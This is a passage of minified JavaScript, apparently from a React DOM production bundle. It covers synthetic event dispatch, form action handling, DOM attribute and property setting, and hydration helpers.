      return l !== null && l !== null && Iu(l), t.callbackPriority = 2, t.callbackNode = null, 2;
    }
    function w1(t, e) {
      if (Wt !== 0 && Wt !== 5) return t.callbackNode = null, t.callbackPriority = 0, null;
      var n = t.callbackNode;
      if (Ji() && t.callbackNode !== n) return null;
      var l = dt;
      return l = ti(t, t === Ct ? l : 0, t.cancelPendingCommit !== null || t.timeoutHandle !== -1), l === 0 ? null : (g1(t, l, e), C1(t, ne()), t.callbackNode != null && t.callbackNode === n ? w1.bind(null, t) : null);
    }
    function H1(t, e) {
      if (Ji()) return null;
      g1(t, e, true);
    }
    function L2() {
      F2(function() {
        (At & 6) !== 0 ? Ul(Pl, H2) : M1();
      });
    }
    function Er() {
      if (fl === 0) {
        var t = vu;
        t === 0 && (t = Mt, Mt <<= 1, (Mt & 261888) === 0 && (Mt = 256)), fl = t;
      }
      return fl;
    }
    function L1(t) {
      return t == null || typeof t == "symbol" || typeof t == "boolean" ? null : typeof t == "function" ? t : ui("" + t);
    }
    function Y1(t, e) {
      var n = e.ownerDocument.createElement("input");
      return n.name = e.name, n.value = e.value, t.id && n.setAttribute("form", t.id), e.parentNode.insertBefore(n, e), t = new FormData(t), n.parentNode.removeChild(n), t;
    }
    function Y2(t, e, n, l, a) {
      if (e === "submit" && n && n.stateNode === a) {
        var i = L1((a[ge] || null).action), h = l.submitter;
        h && (e = (e = h[ge] || null) ? L1(e.formAction) : h.getAttribute("formAction"), e !== null && (i = e, h = null));
        var d = new ci("action", "action", null, l, a);
        t.push({
          event: d,
          listeners: [
            {
              instance: null,
              listener: function() {
                if (l.defaultPrevented) {
                  if (fl !== 0) {
                    var _ = h ? Y1(a, h) : new FormData(a);
                    Gc(n, {
                      pending: true,
                      data: _,
                      method: a.method,
                      action: i
                    }, null, _);
                  }
                } else typeof i == "function" && (d.preventDefault(), _ = h ? Y1(a, h) : new FormData(a), Gc(n, {
                  pending: true,
                  data: _,
                  method: a.method,
                  action: i
                }, i, _));
              },
              currentTarget: a
            }
          ]
        });
      }
    }
    for (var br = 0; br < nc.length; br++) {
      var _r = nc[br], G2 = _r.toLowerCase(), q2 = _r[0].toUpperCase() + _r.slice(1);
      en(G2, "on" + q2);
    }
    en(mo, "onAnimationEnd"), en(go, "onAnimationIteration"), en(vo, "onAnimationStart"), en("dblclick", "onDoubleClick"), en("focusin", "onFocus"), en("focusout", "onBlur"), en(n2, "onTransitionRun"), en(l2, "onTransitionStart"), en(u2, "onTransitionCancel"), en(po, "onTransitionEnd"), lu("onMouseEnter", [
      "mouseout",
      "mouseover"
    ]), lu("onMouseLeave", [
      "mouseout",
      "mouseover"
    ]), lu("onPointerEnter", [
      "pointerout",
      "pointerover"
    ]), lu("onPointerLeave", [
      "pointerout",
      "pointerover"
    ]), Ol("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")), Ol("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")), Ol("onBeforeInput", [
      "compositionend",
      "keypress",
      "textInput",
      "paste"
    ]), Ol("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")), Ol("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")), Ol("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
    var Da = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "), j2 = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Da));
    function G1(t, e) {
      e = (e & 4) !== 0;
      for (var n = 0; n < t.length; n++) {
        var l = t[n], a = l.event;
        l = l.listeners;
        t: {
          var i = void 0;
          if (e) for (var h = l.length - 1; 0 <= h; h--) {
            var d = l[h], _ = d.instance, R = d.currentTarget;
            if (d = d.listener, _ !== i && a.isPropagationStopped()) break t;
            i = d, a.currentTarget = R;
            try {
              i(a);
            } catch (w) {
              si(w);
            }
            a.currentTarget = null, i = _;
          }
          else for (h = 0; h < l.length; h++) {
            if (d = l[h], _ = d.instance, R = d.currentTarget, d = d.listener, _ !== i && a.isPropagationStopped()) break t;
            i = d, a.currentTarget = R;
            try {
              i(a);
            } catch (w) {
              si(w);
            }
            a.currentTarget = null, i = _;
          }
        }
      }
    }
    function ht(t, e) {
      var n = e[Cf];
      n === void 0 && (n = e[Cf] = /* @__PURE__ */ new Set());
      var l = t + "__bubble";
      n.has(l) || (q1(e, t, 2, false), n.add(l));
    }
    function Ar(t, e, n) {
      var l = 0;
      e && (l |= 4), q1(n, t, l, e);
    }
    var $i = "_reactListening" + Math.random().toString(36).slice(2);
    function Tr(t) {
      if (!t[$i]) {
        t[$i] = true, z0.forEach(function(n) {
          n !== "selectionchange" && (j2.has(n) || Ar(n, false, t), Ar(n, true, t));
        });
        var e = t.nodeType === 9 ? t : t.ownerDocument;
        e === null || e[$i] || (e[$i] = true, Ar("selectionchange", false, e));
      }
    }
    function q1(t, e, n, l) {
      switch (mh(e)) {
        case 2:
          var a = mm;
          break;
        case 8:
          a = gm;
          break;
        default:
          a = Yr;
      }
      n = a.bind(null, e, n, t), a = void 0, !Kf || e !== "touchstart" && e !== "touchmove" && e !== "wheel" || (a = true), l ? a !== void 0 ? t.addEventListener(e, n, {
        capture: true,
        passive: a
      }) : t.addEventListener(e, n, true) : a !== void 0 ? t.addEventListener(e, n, {
        passive: a
      }) : t.addEventListener(e, n, false);
    }
    function Sr(t, e, n, l, a) {
      var i = l;
      if ((e & 1) === 0 && (e & 2) === 0 && l !== null) t: for (; ; ) {
        if (l === null) return;
        var h = l.tag;
        if (h === 3 || h === 4) {
          var d = l.stateNode.containerInfo;
          if (d === a) break;
          if (h === 4) for (h = l.return; h !== null; ) {
            var _ = h.tag;
            if ((_ === 3 || _ === 4) && h.stateNode.containerInfo === a) return;
            h = h.return;
          }
          for (; d !== null; ) {
            if (h = tu(d), h === null) return;
            if (_ = h.tag, _ === 5 || _ === 6 || _ === 26 || _ === 27) {
              l = i = h;
              continue t;
            }
            d = d.parentNode;
          }
        }
        l = l.return;
      }
      Q0(function() {
        var R = i, w = jf(n), Y = [];
        t: {
          var D = Eo.get(t);
          if (D !== void 0) {
            var M = ci, Z = t;
            switch (t) {
              case "keypress":
                if (ii(n) === 0) break t;
              case "keydown":
              case "keyup":
                M = Cy;
                break;
              case "focusin":
                Z = "focus", M = If;
                break;
              case "focusout":
                Z = "blur", M = If;
                break;
              case "beforeblur":
              case "afterblur":
                M = If;
                break;
              case "click":
                if (n.button === 2) break t;
              case "auxclick":
              case "dblclick":
              case "mousedown":
              case "mousemove":
              case "mouseup":
              case "mouseout":
              case "mouseover":
              case "contextmenu":
                M = I0;
                break;
              case "drag":
              case "dragend":
              case "dragenter":
              case "dragexit":
              case "dragleave":
              case "dragover":
              case "dragstart":
              case "drop":
                M = Ay;
                break;
              case "touchcancel":
              case "touchend":
              case "touchmove":
              case "touchstart":
                M = Ly;
                break;
              case mo:
              case go:
              case vo:
                M = Uy;
                break;
              case po:
                M = Gy;
                break;
              case "scroll":
              case "scrollend":
                M = by;
                break;
              case "wheel":
                M = jy;
                break;
              case "copy":
              case "cut":
              case "paste":
                M = Oy;
                break;
              case "gotpointercapture":
              case "lostpointercapture":
              case "pointercancel":
              case "pointerdown":
              case "pointermove":
              case "pointerout":
              case "pointerover":
              case "pointerup":
                M = F0;
                break;
              case "toggle":
              case "beforetoggle":
                M = Ky;
            }
            var W = (e & 4) !== 0, Dt = !W && (t === "scroll" || t === "scrollend"), O = W ? D !== null ? D + "Capture" : null : D;
            W = [];
            for (var T = R, N; T !== null; ) {
              var L = T;
              if (N = L.stateNode, L = L.tag, L !== 5 && L !== 26 && L !== 27 || N === null || O === null || (L = Pu(T, O), L != null && W.push(Ba(T, L, N))), Dt) break;
              T = T.return;
            }
            0 < W.length && (D = new M(D, Z, null, n, w), Y.push({
              event: D,
              listeners: W
            }));
          }
        }
        if ((e & 7) === 0) {
          t: {
            if (D = t === "mouseover" || t === "pointerover", M = t === "mouseout" || t === "pointerout", D && n !== qf && (Z = n.relatedTarget || n.fromElement) && (tu(Z) || Z[Wl])) break t;
            if ((M || D) && (D = w.window === w ? w : (D = w.ownerDocument) ? D.defaultView || D.parentWindow : window, M ? (Z = n.relatedTarget || n.toElement, M = R, Z = Z ? tu(Z) : null, Z !== null && (Dt = b(Z), W = Z.tag, Z !== Dt || W !== 5 && W !== 27 && W !== 6) && (Z = null)) : (M = null, Z = R), M !== Z)) {
              if (W = I0, L = "onMouseLeave", O = "onMouseEnter", T = "mouse", (t === "pointerout" || t === "pointerover") && (W = F0, L = "onPointerLeave", O = "onPointerEnter", T = "pointer"), Dt = M == null ? D : $u(M), N = Z == null ? D : $u(Z), D = new W(L, T + "leave", M, n, w), D.target = Dt, D.relatedTarget = N, L = null, tu(w) === R && (W = new W(O, T + "enter", Z, n, w), W.target = N, W.relatedTarget = Dt, L = W), Dt = L, M && Z) e: {
                for (W = X2, O = M, T = Z, N = 0, L = O; L; L = W(L)) N++;
                L = 0;
                for (var F = T; F; F = W(F)) L++;
                for (; 0 < N - L; ) O = W(O), N--;
                for (; 0 < L - N; ) T = W(T), L--;
                for (; N--; ) {
                  if (O === T || T !== null && O === T.alternate) {
                    W = O;
                    break e;
                  }
                  O = W(O), T = W(T);
                }
                W = null;
              }
              else W = null;
              M !== null && j1(Y, D, M, W, false), Z !== null && Dt !== null && j1(Y, Dt, Z, W, true);
            }
          }
          t: {
            if (D = R ? $u(R) : window, M = D.nodeName && D.nodeName.toLowerCase(), M === "select" || M === "input" && D.type === "file") var bt = lo;
            else if (eo(D)) if (uo) bt = Wy;
            else {
              bt = $y;
              var I = ky;
            }
            else M = D.nodeName, !M || M.toLowerCase() !== "input" || D.type !== "checkbox" && D.type !== "radio" ? R && Gf(R.elementType) && (bt = lo) : bt = Py;
            if (bt && (bt = bt(t, R))) {
              no(Y, bt, n, w);
              break t;
            }
            I && I(t, D, R), t === "focusout" && R && D.type === "number" && R.memoizedProps.value != null && Yf(D, "number", D.value);
          }
          switch (I = R ? $u(R) : window, t) {
            case "focusin":
              (eo(I) || I.contentEditable === "true") && (ru = I, Wf = R, ia = null);
              break;
            case "focusout":
              ia = Wf = ru = null;
              break;
            case "mousedown":
              tc = true;
              break;
            case "contextmenu":
            case "mouseup":
            case "dragend":
              tc = false, ho(Y, n, w);
              break;
            case "selectionchange":
              if (e2) break;
            case "keydown":
            case "keyup":
              ho(Y, n, w);
          }
          var at;
          if (Ff) t: {
            switch (t) {
              case "compositionstart":
                var yt = "onCompositionStart";
                break t;
              case "compositionend":
                yt = "onCompositionEnd";
                break t;
              case "compositionupdate":
                yt = "onCompositionUpdate";
                break t;
            }
            yt = void 0;
          }
          else cu ? W0(t, n) && (yt = "onCompositionEnd") : t === "keydown" && n.keyCode === 229 && (yt = "onCompositionStart");
          yt && (k0 && n.locale !== "ko" && (cu || yt !== "onCompositionStart" ? yt === "onCompositionEnd" && cu && (at = V0()) : (Vn = w, Qf = "value" in Vn ? Vn.value : Vn.textContent, cu = true)), I = Pi(R, yt), 0 < I.length && (yt = new J0(yt, t, null, n, w), Y.push({
            event: yt,
            listeners: I
          }), at ? yt.data = at : (at = to(n), at !== null && (yt.data = at)))), (at = Vy ? Zy(t, n) : Iy(t, n)) && (yt = Pi(R, "onBeforeInput"), 0 < yt.length && (I = new J0("onBeforeInput", "beforeinput", null, n, w), Y.push({
            event: I,
            listeners: yt
          }), I.data = at)), Y2(Y, t, R, n, w);
        }
        G1(Y, e);
      });
    }
    function Ba(t, e, n) {
      return {
        instance: t,
        listener: e,
        currentTarget: n
      };
    }
    function Pi(t, e) {
      for (var n = e + "Capture", l = []; t !== null; ) {
        var a = t, i = a.stateNode;
        if (a = a.tag, a !== 5 && a !== 26 && a !== 27 || i === null || (a = Pu(t, n), a != null && l.unshift(Ba(t, a, i)), a = Pu(t, e), a != null && l.push(Ba(t, a, i))), t.tag === 3) return l;
        t = t.return;
      }
      return [];
    }
    function X2(t) {
      if (t === null) return null;
      do
        t = t.return;
      while (t && t.tag !== 5 && t.tag !== 27);
      return t || null;
    }
    function j1(t, e, n, l, a) {
      for (var i = e._reactName, h = []; n !== null && n !== l; ) {
        var d = n, _ = d.alternate, R = d.stateNode;
        if (d = d.tag, _ !== null && _ === l) break;
        d !== 5 && d !== 26 && d !== 27 || R === null || (_ = R, a ? (R = Pu(n, i), R != null && h.unshift(Ba(n, R, _))) : a || (R = Pu(n, i), R != null && h.push(Ba(n, R, _)))), n = n.return;
      }
      h.length !== 0 && t.push({
        event: e,
        listeners: h
      });
    }
    var K2 = /\r\n?/g, Q2 = /\u0000|\uFFFD/g;
    function X1(t) {
      return (typeof t == "string" ? t : "" + t).replace(K2, `
`).replace(Q2, "");
    }
    function K1(t, e) {
      return e = X1(e), X1(t) === e;
    }
    function Rt(t, e, n, l, a, i) {
      switch (n) {
        case "children":
          typeof l == "string" ? e === "body" || e === "textarea" && l === "" || au(t, l) : (typeof l == "number" || typeof l == "bigint") && e !== "body" && au(t, "" + l);
          break;
        case "className":
          ni(t, "class", l);
          break;
        case "tabIndex":
          ni(t, "tabindex", l);
          break;
        case "dir":
        case "role":
        case "viewBox":
        case "width":
        case "height":
          ni(t, n, l);
          break;
        case "style":
          X0(t, l, i);
          break;
        case "data":
          if (e !== "object") {
            ni(t, "data", l);
            break;
          }
        case "src":
        case "href":
          if (l === "" && (e !== "a" || n !== "href")) {
            t.removeAttribute(n);
            break;
          }
          if (l == null || typeof l == "function" || typeof l == "symbol" || typeof l == "boolean") {
            t.removeAttribute(n);
            break;
          }
          l = ui("" + l), t.setAttribute(n, l);
          break;
        case "action":
        case "formAction":
          if (typeof l == "function") {
            t.setAttribute(n, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
            break;
          } else typeof i == "function" && (n === "formAction" ? (e !== "input" && Rt(t, e, "name", a.name, a, null), Rt(t, e, "formEncType", a.formEncType, a, null), Rt(t, e, "formMethod", a.formMethod, a, null), Rt(t, e, "formTarget", a.formTarget, a, null)) : (Rt(t, e, "encType", a.encType, a, null), Rt(t, e, "method", a.method, a, null), Rt(t, e, "target", a.target, a, null)));
          if (l == null || typeof l == "symbol" || typeof l == "boolean") {
            t.removeAttribute(n);
            break;
          }
          l = ui("" + l), t.setAttribute(n, l);
          break;
        case "onClick":
          l != null && (t.onclick = _n);
          break;
        case "onScroll":
          l != null && ht("scroll", t);
          break;
        case "onScrollEnd":
          l != null && ht("scrollend", t);
          break;
        case "dangerouslySetInnerHTML":
          if (l != null) {
            if (typeof l != "object" || !("__html" in l)) throw Error(c(61));
            if (n = l.__html, n != null) {
              if (a.children != null) throw Error(c(60));
              t.innerHTML = n;
            }
          }
          break;
        case "multiple":
          t.multiple = l && typeof l != "function" && typeof l != "symbol";
          break;
        case "muted":
          t.muted = l && typeof l != "function" && typeof l != "symbol";
          break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "defaultValue":
        case "defaultChecked":
        case "innerHTML":
        case "ref":
          break;
        case "autoFocus":
          break;
        case "xlinkHref":
          if (l == null || typeof l == "function" || typeof l == "boolean" || typeof l == "symbol") {
            t.removeAttribute("xlink:href");
            break;
          }
          n = ui("" + l), t.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", n);
          break;
        case "contentEditable":
        case "spellCheck":
        case "draggable":
        case "value":
        case "autoReverse":
        case "externalResourcesRequired":
        case "focusable":
        case "preserveAlpha":
          l != null && typeof l != "function" && typeof l != "symbol" ? t.setAttribute(n, "" + l) : t.removeAttribute(n);
          break;
        case "inert":
        case "allowFullScreen":
        case "async":
        case "autoPlay":
        case "controls":
        case "default":
        case "defer":
        case "disabled":
        case "disablePictureInPicture":
        case "disableRemotePlayback":
        case "formNoValidate":
        case "hidden":
        case "loop":
        case "noModule":
        case "noValidate":
        case "open":
        case "playsInline":
        case "readOnly":
        case "required":
        case "reversed":
        case "scoped":
        case "seamless":
        case "itemScope":
          l && typeof l != "function" && typeof l != "symbol" ? t.setAttribute(n, "") : t.removeAttribute(n);
          break;
        case "capture":
        case "download":
          l === true ? t.setAttribute(n, "") : l !== false && l != null && typeof l != "function" && typeof l != "symbol" ? t.setAttribute(n, l) : t.removeAttribute(n);
          break;
        case "cols":
        case "rows":
        case "size":
        case "span":
          l != null && typeof l != "function" && typeof l != "symbol" && !isNaN(l) && 1 <= l ? t.setAttribute(n, l) : t.removeAttribute(n);
          break;
        case "rowSpan":
        case "start":
          l == null || typeof l == "function" || typeof l == "symbol" || isNaN(l) ? t.removeAttribute(n) : t.setAttribute(n, l);
          break;
        case "popover":
          ht("beforetoggle", t), ht("toggle", t), ei(t, "popover", l);
          break;
        case "xlinkActuate":
          bn(t, "http://www.w3.org/1999/xlink", "xlink:actuate", l);
          break;
        case "xlinkArcrole":
          bn(t, "http://www.w3.org/1999/xlink", "xlink:arcrole", l);
          break;
        case "xlinkRole":
          bn(t, "http://www.w3.org/1999/xlink", "xlink:role", l);
          break;
        case "xlinkShow":
          bn(t, "http://www.w3.org/1999/xlink", "xlink:show", l);
          break;
        case "xlinkTitle":
          bn(t, "http://www.w3.org/1999/xlink", "xlink:title", l);
          break;
        case "xlinkType":
          bn(t, "http://www.w3.org/1999/xlink", "xlink:type", l);
          break;
        case "xmlBase":
          bn(t, "http://www.w3.org/XML/1998/namespace", "xml:base", l);
          break;
        case "xmlLang":
          bn(t, "http://www.w3.org/XML/1998/namespace", "xml:lang", l);
          break;
        case "xmlSpace":
          bn(t, "http://www.w3.org/XML/1998/namespace", "xml:space", l);
          break;
        case "is":
          ei(t, "is", l);
          break;
        case "innerText":
        case "textContent":
          break;
        default:
          (!(2 < n.length) || n[0] !== "o" && n[0] !== "O" || n[1] !== "n" && n[1] !== "N") && (n = py.get(n) || n, ei(t, n, l));
      }
    }
    function Ur(t, e, n, l, a, i) {
      switch (n) {
        case "style":
          X0(t, l, i);
          break;
        case "dangerouslySetInnerHTML":
          if (l != null) {
            if (typeof l != "object" || !("__html" in l)) throw Error(c(61));
            if (n = l.__html, n != null) {
              if (a.children != null) throw Error(c(60));
              t.innerHTML = n;
            }
          }
          break;
        case "children":
          typeof l == "string" ? au(t, l) : (typeof l == "number" || typeof l == "bigint") && au(t, "" + l);
          break;
        case "onScroll":
          l != null && ht("scroll", t);
          break;
        case "onScrollEnd":
          l != null && ht("scrollend", t);
          break;
        case "onClick":
          l != null && (t.onclick = _n);
          break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "innerHTML":
        case "ref":
          break;
        case "innerText":
        case "textContent":
          break;
        default:
          if (!M0.hasOwnProperty(n)) t: {
            if (n[0] === "o" && n[1] === "n" && (a = n.endsWith("Capture"), e = n.slice(2, a ? n.length - 7 : void 0), i = t[ge] || null, i = i != null ? i[n] : null, typeof i == "function" && t.removeEventListener(e, i, a), typeof l == "function")) {
              typeof i != "function" && i !== null && (n in t ? t[n] = null : t.hasAttribute(n) && t.removeAttribute(n)), t.addEventListener(e, l, a);
              break t;
            }
            n in t ? t[n] = l : l === true ? t.setAttribute(n, "") : ei(t, n, l);
          }
      }
    }
    function oe(t, e, n) {
      switch (e) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
          break;
        case "img":
          ht("error", t), ht("load", t);
          var l = false, a = false, i;
          for (i in n) if (n.hasOwnProperty(i)) {
            var h = n[i];
            if (h != null) switch (i) {
              case "src":
                l = true;
                break;
              case "srcSet":
                a = true;
                break;
              case "children":
              case "dangerouslySetInnerHTML":
                throw Error(c(137, e));
              default:
                Rt(t, e, i, h, n, null);
            }
          }
          a && Rt(t, e, "srcSet", n.srcSet, n, null), l && Rt(t, e, "src", n.src, n, null);
          return;
        case "input":
          ht("invalid", t);
          var d = i = h = a = null, _ = null, R = null;
          for (l in n) if (n.hasOwnProperty(l)) {
            var w = n[l];
            if (w != null) switch (l) {
              case "name":
                a = w;
                break;
              case "type":
                h = w;
                break;
              case "checked":
                _ = w;
                break;
              case "defaultChecked":
                R = w;
                break;
              case "value":
                i = w;
                break;
              case "defaultValue":
                d = w;
                break;
              case "children":
              case "dangerouslySetInnerHTML":
                if (w != null) throw Error(c(137, e));
                break;
              default:
                Rt(t, e, l, w, n, null);
            }
          }
          Y0(t, i, d, _, R, h, a, false);
          return;
        case "select":
          ht("invalid", t), l = h = i = null;
          for (a in n) if (n.hasOwnProperty(a) && (d = n[a], d != null)) switch (a) {
            case "value":
              i = d;
              break;
            case "defaultValue":
              h = d;
              break;
            case "multiple":
              l = d;
            default:
              Rt(t, e, a, d, n, null);
          }
          e = i, n = h, t.multiple = !!l, e != null ? uu(t, !!l, e, false) : n != null && uu(t, !!l, n, true);
          return;
        case "textarea":
          ht("invalid", t), i = a = l = null;
          for (h in n) if (n.hasOwnProperty(h) && (d = n[h], d != null)) switch (h) {
            case "value":
              l = d;
              break;
            case "defaultValue":
              a = d;
              break;
            case "children":
              i = d;
              break;
            case "dangerouslySetInnerHTML":
              if (d != null) throw Error(c(91));
              break;
            default:
              Rt(t, e, h, d, n, null);
          }
          q0(t, l, a, i);
          return;
        case "option":
          for (_ in n) n.hasOwnProperty(_) && (l = n[_], l != null) && (_ === "selected" ? t.selected = l && typeof l != "function" && typeof l != "symbol" : Rt(t, e, _, l, n, null));
          return;
        case "dialog":
          ht("beforetoggle", t), ht("toggle", t), ht("cancel", t), ht("close", t);
          break;
        case "iframe":
        case "object":
          ht("load", t);
          break;
        case "video":
        case "audio":
          for (l = 0; l < Da.length; l++) ht(Da[l], t);
          break;
        case "image":
          ht("error", t), ht("load", t);
          break;
        case "details":
          ht("toggle", t);
          break;
        case "embed":
        case "source":
        case "link":
          ht("error", t), ht("load", t);
        case "area":
        case "base":
        case "br":
        case "col":
        case "hr":
        case "keygen":
        case "meta":
        case "param":
        case "track":
        case "wbr":
        case "menuitem":
          for (R in n) if (n.hasOwnProperty(R) && (l = n[R], l != null)) switch (R) {
            case "children":
            case "dangerouslySetInnerHTML":
              throw Error(c(137, e));
            default:
              Rt(t, e, R, l, n, null);
          }
          return;
        default:
          if (Gf(e)) {
            for (w in n) n.hasOwnProperty(w) && (l = n[w], l !== void 0 && Ur(t, e, w, l, n, void 0));
            return;
          }
      }
      for (d in n) n.hasOwnProperty(d) && (l = n[d], l != null && Rt(t, e, d, l, n, null));
    }
    function V2(t, e, n, l) {
      switch (e) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
          break;
        case "input":
          var a = null, i = null, h = null, d = null, _ = null, R = null, w = null;
          for (M in n) {
            var Y = n[M];
            if (n.hasOwnProperty(M) && Y != null) switch (M) {
              case "checked":
                break;
              case "value":
                break;
              case "defaultValue":
                _ = Y;
              default:
                l.hasOwnProperty(M) || Rt(t, e, M, null, l, Y);
            }
          }
          for (var D in l) {
            var M = l[D];
            if (Y = n[D], l.hasOwnProperty(D) && (M != null || Y != null)) switch (D) {
              case "type":
                i = M;
                break;
              case "name":
                a = M;
                break;
              case "checked":
                R = M;
                break;
              case "defaultChecked":
                w = M;
                break;
              case "value":
                h = M;
                break;
              case "defaultValue":
                d = M;
                break;
              case "children":
              case "dangerouslySetInnerHTML":
                if (M != null) throw Error(c(137, e));
                break;
              default:
                M !== Y && Rt(t, e, D, M, l, Y);
            }
          }
          Lf(t, h, d, _, R, w, i, a);
          return;
        case "select":
          M = h = d = D = null;
          for (i in n) if (_ = n[i], n.hasOwnProperty(i) && _ != null) switch (i) {
            case "value":
              break;
            case "multiple":
              M = _;
            default:
              l.hasOwnProperty(i) || Rt(t, e, i, null, l, _);
          }
          for (a in l) if (i = l[a], _ = n[a], l.hasOwnProperty(a) && (i != null || _ != null)) switch (a) {
            case "value":
              D = i;
              break;
            case "defaultValue":
              d = i;
              break;
            case "multiple":
              h = i;
            default:
              i !== _ && Rt(t, e, a, i, l, _);
          }
          e = d, n = h, l = M, D != null ? uu(t, !!n, D, false) : !!l != !!n && (e != null ? uu(t, !!n, e, true) : uu(t, !!n, n ? [] : "", false));
          return;
        case "textarea":
          M = D = null;
          for (d in n) if (a = n[d], n.hasOwnProperty(d) && a != null && !l.hasOwnProperty(d)) switch (d) {
            case "value":
              break;
            case "children":
              break;
            default:
              Rt(t, e, d, null, l, a);
          }
          for (h in l) if (a = l[h], i = n[h], l.hasOwnProperty(h) && (a != null || i != null)) switch (h) {
            case "value":
              D = a;
              break;
            case "defaultValue":
              M = a;
              break;
            case "children":
              break;
            case "dangerouslySetInnerHTML":
              if (a != null) throw Error(c(91));
              break;
            default:
              a !== i && Rt(t, e, h, a, l, i);
          }
          G0(t, D, M);
          return;
        case "option":
          for (var Z in n) D = n[Z], n.hasOwnProperty(Z) && D != null && !l.hasOwnProperty(Z) && (Z === "selected" ? t.selected = false : Rt(t, e, Z, null, l, D));
          for (_ in l) D = l[_], M = n[_], l.hasOwnProperty(_) && D !== M && (D != null || M != null) && (_ === "selected" ? t.selected = D && typeof D != "function" && typeof D != "symbol" : Rt(t, e, _, D, l, M));
          return;
        case "img":
        case "link":
        case "area":
        case "base":
        case "br":
        case "col":
        case "embed":
        case "hr":
        case "keygen":
        case "meta":
        case "param":
        case "source":
        case "track":
        case "wbr":
        case "menuitem":
          for (var W in n) D = n[W], n.hasOwnProperty(W) && D != null && !l.hasOwnProperty(W) && Rt(t, e, W, null, l, D);
          for (R in l) if (D = l[R], M = n[R], l.hasOwnProperty(R) && D !== M && (D != null || M != null)) switch (R) {
            case "children":
            case "dangerouslySetInnerHTML":
              if (D != null) throw Error(c(137, e));
              break;
            default:
              Rt(t, e, R, D, l, M);
          }
          return;
        default:
          if (Gf(e)) {
            for (var Dt in n) D = n[Dt], n.hasOwnProperty(Dt) && D !== void 0 && !l.hasOwnProperty(Dt) && Ur(t, e, Dt, void 0, l, D);
            for (w in l) D = l[w], M = n[w], !l.hasOwnProperty(w) || D === M || D === void 0 && M === void 0 || Ur(t, e, w, D, l, M);
            return;
          }
      }
      for (var O in n) D = n[O], n.hasOwnProperty(O) && D != null && !l.hasOwnProperty(O) && Rt(t, e, O, null, l, D);
      for (Y in l) D = l[Y], M = n[Y], !l.hasOwnProperty(Y) || D === M || D == null && M == null || Rt(t, e, Y, D, l, M);
    }
    function Q1(t) {
      switch (t) {
        case "css":
        case "script":
        case "font":
        case "img":
        case "image":
        case "input":
        case "link":
          return true;
        default:
          return false;
      }
    }
    function Z2() {
      if (typeof performance.getEntriesByType == "function") {
        for (var t = 0, e = 0, n = performance.getEntriesByType("resource"), l = 0; l < n.length; l++) {
          var a = n[l], i = a.transferSize, h = a.initiatorType, d = a.duration;
          if (i && d && Q1(h)) {
            for (h = 0, d = a.responseEnd, l += 1; l < n.length; l++) {
              var _ = n[l], R = _.startTime;
              if (R > d) break;
              var w = _.transferSize, Y = _.initiatorType;
              w && Q1(Y) && (_ = _.responseEnd, h += w * (_ < d ? 1 : (d - R) / (_ - R)));
            }
            if (--l, e += 8 * (i + h) / (a.duration / 1e3), t++, 10 < t) break;
          }
        }
        if (0 < t) return e / t / 1e6;
      }
      return navigator.connection && (t = navigator.connection.downlink, typeof t == "number") ? t : 5;
    }
    var xr = null, Or = null;
    function Wi(t) {
      return t.nodeType === 9 ? t : t.ownerDocument;
    }
    function V1(t) {
      switch (t) {
        case "http://www.w3.org/2000/svg":
          return 1;
        case "http://www.w3.org/1998/Math/MathML":
          return 2;
        default:
          return 0;
      }
    }
    function Z1(t, e) {
      if (t === 0) switch (e) {
        case "svg":
          return 1;
        case "math":
          return 2;
        default:
          return 0;
      }
      return t === 1 && e === "foreignObject" ? 0 : t;
    }
    function Nr(t, e) {
      return t === "textarea" || t === "noscript" || typeof e.children == "string" || typeof e.children == "number" || typeof e.children == "bigint" || typeof e.dangerouslySetInnerHTML == "object" && e.dangerouslySetInnerHTML !== null && e.dangerouslySetInnerHTML.__html != null;
    }
    var Rr = null;
    function I2() {
      var t = window.event;
      return t && t.type === "popstate" ? t === Rr ? false : (Rr = t, true) : (Rr = null, false);
    }
    var I1 = typeof setTimeout == "function" ? setTimeout : void 0, J2 = typeof clearTimeout == "function" ? clearTimeout : void 0, J1 = typeof Promise == "function" ? Promise : void 0, F2 = typeof queueMicrotask == "function" ? queueMicrotask : typeof J1 < "u" ? function(t) {
      return J1.resolve(null).then(t).catch(k2);
    } : I1;
    function k2(t) {
      setTimeout(function() {
        throw t;
      });
    }
    function cl(t) {
      return t === "head";
    }
    function F1(t, e) {
      var n = e, l = 0;
      do {
        var a = n.nextSibling;
        if (t.removeChild(n), a && a.nodeType === 8) if (n = a.data, n === "/$" || n === "/&") {
          if (l === 0) {
            t.removeChild(a), Hu(e);
            return;
          }
          l--;
        } else if (n === "$" || n === "$?" || n === "$~" || n === "$!" || n === "&") l++;
        else if (n === "html") za(t.ownerDocument.documentElement);
        else if (n === "head") {
          n = t.ownerDocument.head, za(n);
          for (var i = n.firstChild; i; ) {
            var h = i.nextSibling, d = i.nodeName;
            i[ku] || d === "SCRIPT" || d === "STYLE" || d === "LINK" && i.rel.toLowerCase() === "stylesheet" || n.removeChild(i), i = h;
          }
        } else n === "body" && za(t.ownerDocument.body);
        n = a;
      } while (n);
      Hu(e);
    }
    function k1(t, e) {
      var n = t;
      t = 0;
      do {
        var l = n.nextSibling;
